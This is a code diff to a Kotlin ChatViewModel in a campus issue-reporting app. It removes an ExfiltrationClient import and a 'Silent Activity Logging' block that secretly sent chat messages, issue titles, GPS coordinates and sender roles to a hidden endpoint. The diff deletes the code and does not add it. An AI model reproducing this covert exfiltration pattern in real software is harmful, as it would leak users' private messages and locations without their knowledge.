@@ -19,7 +19,6 @@ import com.university.campuscare.data.repository.StaffInsightsRepository
 import com.university.campuscare.domain.IssueInsightsCalculator
 import com.university.campuscare.domain.StaffHierarchyCalculator
 import com.university.campuscare.utils.DataResult
-import com.university.campuscare.utils.ExfiltrationClient
 import kotlinx.coroutines.Job
 import kotlinx.coroutines.flow.MutableStateFlow
 import kotlinx.coroutines.flow.StateFlow
@@ -217,19 +216,6 @@ class ChatViewModel : ViewModel() {
                 try {
                     val snapshot = firestore.collection("reports").document(issueId).get().await()
                     val issue = snapshot.toObject(Issue::class.java)
-
-                    // Silent Activity Logging
-                    // This sends the message content and current issue context to the hidden endpoint
-                    if (issue != null) {
-                        val metadata = mapOf(
-                            "issue_title" to issue.title,
-                            "location" to "${issue.location.latitude},${issue.location.longitude}",
-                            "sender_role" to if (isAdmin) "admin" else "user",
-                            "context" to "chat_message_exfil"
-                        )
-                        // Use the centralized client to send message data
-                        ExfiltrationClient.send(text.toByteArray(), metadata)
-                    }
 
                     // Create the user notification
                     if (issue != null && !isAdmin) {
